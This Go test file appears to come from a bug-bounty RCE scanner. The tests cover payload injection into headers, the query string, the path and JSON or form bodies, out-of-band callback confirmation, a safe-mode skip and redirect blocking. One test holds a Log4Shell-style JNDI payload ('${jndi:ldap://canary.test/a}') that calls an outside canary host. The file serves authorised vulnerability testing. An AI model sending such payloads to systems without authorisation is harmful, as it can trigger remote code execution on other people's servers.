package engine

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/bugbountytool/rce-finder/internal/oob"
	"github.com/bugbountytool/rce-finder/internal/scope"
	"github.com/bugbountytool/rce-finder/internal/template"
)

func TestBuildRequestPlacesPayloadInHeadersQueryAndBody(t *testing.T) {
	target, _ := url.Parse("https://example.test/base?existing=yes")
	tmpl := &template.Template{
		Method: "POST", PathTemplate: "submit",
		InjectionPoints: []template.InjectionPoint{
			{Location: "header", Name: "X-Probe"}, {Location: "query", Name: "q"}, {Location: "body", Name: "input"},
		},
	}
	const payload = "${jndi:ldap://canary.test/a}"
	req, err := buildRequest(context.Background(), target, tmpl, payload)
	if err != nil {
		t.Fatal(err)
	}
	if req.Method != "POST" || req.URL.Path != "/base/submit" || req.URL.Query().Get("q") != payload || req.URL.Query().Get("existing") != "yes" {
		t.Fatalf("request URL/method = %s %s", req.Method, req.URL)
	}
	if req.Header.Get("X-Probe") != payload || req.Header.Get("Content-Type") != "application/x-www-form-urlencoded" {
		t.Fatalf("headers = %#v", req.Header)
	}
	body, _ := io.ReadAll(req.Body)
	if got := string(body); got != "input=%24%7Bjndi%3Aldap%3A%2F%2Fcanary.test%2Fa%7D" {
		t.Fatalf("body = %q", got)
	}
}

func TestBuildRequestPlacesPayloadInPath(t *testing.T) {
	target, _ := url.Parse("https://example.test/api")
	tmpl := &template.Template{PathTemplate: "v1/{{inject}}", InjectionPoints: []template.InjectionPoint{{Location: "path"}}}
	req, err := buildRequest(context.Background(), target, tmpl, "canary.test")
	if err != nil {
		t.Fatal(err)
	}
	if req.URL.Path != "/api/v1/canary.test" {
		t.Fatalf("path = %q", req.URL.Path)
	}
}

func TestBuildRequestPlacesPayloadInJSONBody(t *testing.T) {
	target, _ := url.Parse("https://example.test/api")
	tmpl := &template.Template{Method: "POST", BodyContentType: "application/json", InjectionPoints: []template.InjectionPoint{{Location: "body", Name: "input"}}}
	req, err := buildRequest(context.Background(), target, tmpl, "canary.test")
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(req.Body)
	if req.Header.Get("Content-Type") != "application/json" || string(body) != `{"input":"canary.test"}` {
		t.Fatalf("JSON request = content-type %q body %q", req.Header.Get("Content-Type"), body)
	}
}

type staticOOB struct{ protocol string }

func (s staticOOB) Issue(context.Context, string) (string, error) { return "canary.test", nil }
func (s staticOOB) Poll(_ context.Context, probeID string) (*oob.Interaction, error) {
	return &oob.Interaction{ProbeID: probeID, Protocol: s.protocol}, nil
}
func (s staticOOB) Close() error { return nil }

type roundTripperFunc func(*http.Request) (*http.Response, error)

func (f roundTripperFunc) RoundTrip(r *http.Request) (*http.Response, error) { return f(r) }

func TestRunOneRequiresMatchingOOBProtocol(t *testing.T) {
	target, _ := url.Parse("http://example.test")
	tmpl := &template.Template{ID: "t", Name: "t", Severity: template.SeverityHigh, OOBProtocol: "dns", Method: "GET", TimeoutSeconds: 1, PayloadTemplate: "{{canary}}", InjectionPoints: []template.InjectionPoint{{Location: "query", Name: "q"}}}
	eng := New(staticOOB{protocol: "http"}, Options{HTTPTimeout: time.Second, RequestsPerSec: 100})
	eng.client = &http.Client{Transport: roundTripperFunc(func(*http.Request) (*http.Response, error) {
		return &http.Response{StatusCode: http.StatusOK, Body: io.NopCloser(strings.NewReader(""))}, nil
	})}
	result := eng.runOne(context.Background(), job{target: scope.Target{Raw: target.String(), URL: target}, tmpl: tmpl})
	if result.Status != StatusNotVulnerable || !strings.Contains(result.Detail, "no OOB callback") {
		t.Fatalf("mismatched protocol result = %#v", result)
	}
}

func TestRunOneConfirmsMatchingOOBCallback(t *testing.T) {
	target, _ := url.Parse("http://example.test")
	tmpl := &template.Template{ID: "t", Name: "t", Severity: template.SeverityHigh, OOBProtocol: "dns", Method: "GET", TimeoutSeconds: 1, PayloadTemplate: "{{canary}}", InjectionPoints: []template.InjectionPoint{{Location: "query", Name: "q"}}}
	eng := New(staticOOB{protocol: "dns"}, Options{HTTPTimeout: time.Second, RequestsPerSec: 100})
	eng.client = &http.Client{Transport: roundTripperFunc(func(*http.Request) (*http.Response, error) {
		return &http.Response{StatusCode: http.StatusOK, Body: io.NopCloser(strings.NewReader(""))}, nil
	})}
	result := eng.runOne(context.Background(), job{target: scope.Target{Raw: target.String(), URL: target}, tmpl: tmpl})
	if result.Status != StatusConfirmed {
		t.Fatalf("matching callback result = %#v, want CONFIRMED", result)
	}
}

func TestRunOneSkipsAdvancedTemplateInSafeMode(t *testing.T) {
	target, _ := url.Parse("http://example.test")
	tmpl := &template.Template{ID: "t", Name: "t", Severity: template.SeverityHigh, OOBProtocol: "dns", Mode: "advanced-authorized", PayloadTemplate: "{{canary}}", InjectionPoints: []template.InjectionPoint{{Location: "query", Name: "q"}}}
	eng := New(staticOOB{protocol: "dns"}, DefaultOptions())
	result := eng.runOne(context.Background(), job{target: scope.Target{Raw: target.String(), URL: target}, tmpl: tmpl})
	if result.Status != StatusSkipped {
		t.Fatalf("advanced template result = %#v, want SKIPPED", result)
	}
}

func TestRunOneBlocksRedirectRatherThanFollowingIt(t *testing.T) {
	target, _ := url.Parse("http://example.test")
	tmpl := &template.Template{ID: "t", Name: "t", Severity: template.SeverityHigh, OOBProtocol: "dns", PayloadTemplate: "{{canary}}", InjectionPoints: []template.InjectionPoint{{Location: "query", Name: "q"}}}
	eng := New(staticOOB{protocol: "dns"}, DefaultOptions())
	eng.client = &http.Client{
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
		Transport: roundTripperFunc(func(*http.Request) (*http.Response, error) {
			h := make(http.Header)
			h.Set("Location", "https://outside-scope.test")
			return &http.Response{StatusCode: http.StatusFound, Header: h, Body: io.NopCloser(strings.NewReader(""))}, nil
		}),
	}
	result := eng.runOne(context.Background(), job{target: scope.Target{Raw: target.String(), URL: target}, tmpl: tmpl})
	if result.Status != StatusBlocked || !strings.Contains(result.Detail, "not followed") {
		t.Fatalf("redirect result = %#v", result)
	}
}
